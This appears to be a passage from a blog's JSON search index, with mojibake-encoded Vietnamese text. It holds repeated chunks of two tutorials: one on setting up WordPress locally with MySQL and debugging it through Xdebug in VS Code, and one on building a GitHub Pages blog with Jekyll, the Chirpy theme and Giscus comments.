affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u003e CREATE USER wordpress@localhost IDENTIFIED BY ''; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u003e GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u003e FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u003e quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•: sudo service mysql start Configure WordP","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-wordpress"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥. Add PHP Debug extension on VS Code\rV√†o Extensions (Ctrl+Shift+X) =\u003e t√¨m PHP Debug (by Felix Becker) =\u003e Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a: php -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK. Configure Xdebug\rsudo nano /etc/php/\u003cversion\u003e/apache2/php.ini Th√™m v√†o cu·ªëi file zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003. Sau ƒë√≥ restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rM·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode code /srv/www/wordpress Trong VS Code =\u003e Run and Debug (Ctrl+Shift+D) =\u003e t·∫°o file launch.json v·ªõi n·ªôi dung: pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code. Nh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#setup-debug-on-vscode"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥. Add PHP Debug extension on VS Code\rV√†o Extensions (Ctrl+Shift+X) =\u003e t√¨m PHP Debug (by Felix Becker) =\u003e Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a: php -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK. Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Th√™m v√†o cu·ªëi file zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003. Sau ƒë√≥ restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rM·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode code /srv/www/wordpress Trong VS Code =\u003e Run and Debug (Ctrl+Shift+D) =\u003e t·∫°o file launch.json v·ªõi n·ªôi dung: pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code. Nh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#add-php-debug-extension-on-vs-code"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥. Add PHP Debug extension on VS Code\rV√†o Extensions (Ctrl+Shift+X) =\u003e t√¨m PHP Debug (by Felix Becker) =\u003e Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a: php -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK. Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Th√™m v√†o cu·ªëi file zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003. Sau ƒë√≥ restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rM·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode code /srv/www/wordpress Trong VS Code =\u003e Run and Debug (Ctrl+Shift+D) =\u003e t·∫°o file launch.json v·ªõi n·ªôi dung: pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code. Nh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#install-xdebug-on-ubuntu"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥. Add PHP Debug extension on VS Code\rV√†o Extensions (Ctrl+Shift+X) =\u003e t√¨m PHP Debug (by Felix Becker) =\u003e Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a: php -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK. Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Th√™m v√†o cu·ªëi file zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003. Sau ƒë√≥ restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rM·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode code /srv/www/wordpress Trong VS Code =\u003e Run and Debug (Ctrl+Shift+D) =\u003e t·∫°o file launch.json v·ªõi n·ªôi dung: pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code. Nh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-xdebug"},{"categories":["Web"],"collections":null,"content":"Setup Debug on VSCode\rƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥. Add PHP Debug extension on VS Code\rV√†o Extensions (Ctrl+Shift+X) =\u003e t√¨m PHP Debug (by Felix Becker) =\u003e Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug. Install Xdebug on Ubuntu\rsudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a: php -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK. Configure Xdebug\rsudo nano /etc/php//apache2/php.ini Th√™m v√†o cu·ªëi file zend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003. Sau ƒë√≥ restart Apache: sudo systemctl restart apache2 Configure VSCode launch.json\rM·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode code /srv/www/wordpress Trong VS Code =\u003e Run and Debug (Ctrl+Shift+D) =\u003e t·∫°o file launch.json v·ªõi n·ªôi dung: pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code. Nh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:3:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#configure-vscode-launchjson"},{"categories":["Web"],"collections":null,"content":"Extend\r","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:4:0","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#extend"},{"categories":["Web"],"collections":null,"content":"Required Version\rM·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói. ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:4:1","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#required-version"},{"categories":["Web"],"collections":null,"content":"WordPress Auto Update\rT·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho: B·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc. Qu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php ƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php: define( 'WP_AUTO_UPDATE_CORE', false ); ","date":"2025-08-21","objectID":"/vi/posts/2025-08-21-wordpress-local-and-debugging/:4:2","tags":["cms","php","wordpress"],"title":"WordPress Local and Debugging","uri":"/vi/posts/2025-08-21-wordpress-local-and-debugging/#wordpress-auto-update"},{"categories":["Web"],"collections":null,"content":"How to create your personal blog using Github Pages with \"comment\" feature","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/"},{"categories":["Web"],"collections":null,"content":"Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus. Github Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng. Jekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥. Giscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer. ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:0:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#"},{"categories":["Web"],"collections":null,"content":"Requirements\rT√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:1:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#requirements"},{"categories":["Web"],"collections":null,"content":"Creating a Site Repository\r·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog. C√°c b∆∞·ªõc th·ª±c hi·ªán: ƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u003cusername\u003e.github.io, thay ƒë·ªïi \u003cusername\u003e th√†nh Github username c·ªßa b·∫°n. ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:2:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#creating-a-site-repository"},{"categories":["Web"],"collections":null,"content":"Setting up the Environment\rC√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog: Sau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#setting-up-the-environment"},{"categories":["Web"],"collections":null,"content":"Using Dev Containers (Recommended for Windows)\rDev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container. C√°c b∆∞·ªõc th·ª±c hi·ªán: C√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#using-dev-containers-recommended-for-windows"},{"categories":["Web"],"collections":null,"content":"Setting up Natively (Recommended for Unix-like OS)\rV·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø. C√°c b∆∞·ªõc th·ª±c hi·ªán: L√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path 'vendor/bundle' bundle install ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:3:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#setting-up-natively-recommended-for-unix-like-os"},{"categories":["Web"],"collections":null,"content":"Usage\r","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#usage"},{"categories":["Web"],"collections":null,"content":"Start the Jekyll Server\rƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y: bundle exec jekyll s ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#start-the-jekyll-server"},{"categories":["Web"],"collections":null,"content":"Configuration\rM·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm: lang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#configuration"},{"categories":["Web"],"collections":null,"content":"Comment feature via Giscus\rTa s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠. C√°c b∆∞·ªõc th·ª±c hi·ªán: C√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u003cusername\u003e/\u003cusername\u003e.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:3","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#comment-feature-via-giscus"},{"categories":["Web"],"collections":null,"content":"Customize the Favicon\rT·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes C√°c b∆∞·ªõc th·ª±c hi·ªán: Truy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:4:4","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#customize-the-favicon"},{"categories":["Web"],"collections":null,"content":"Extends\r","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:0","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#extends"},{"categories":["Web"],"collections":null,"content":"Remove meta tag in Footer\rC√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau: T·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \"\" ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:1","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#remove-meta-tag-in-footer"},{"categories":["Web"],"collections":null,"content":"Write a post\rTham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t ","date":"2025-08-19","objectID":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/:5:2","tags":["blog","jekyll","giscus","github"],"title":"Github Pages with Jekyll themes and Giscus","uri":"/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/#write-a-post"}]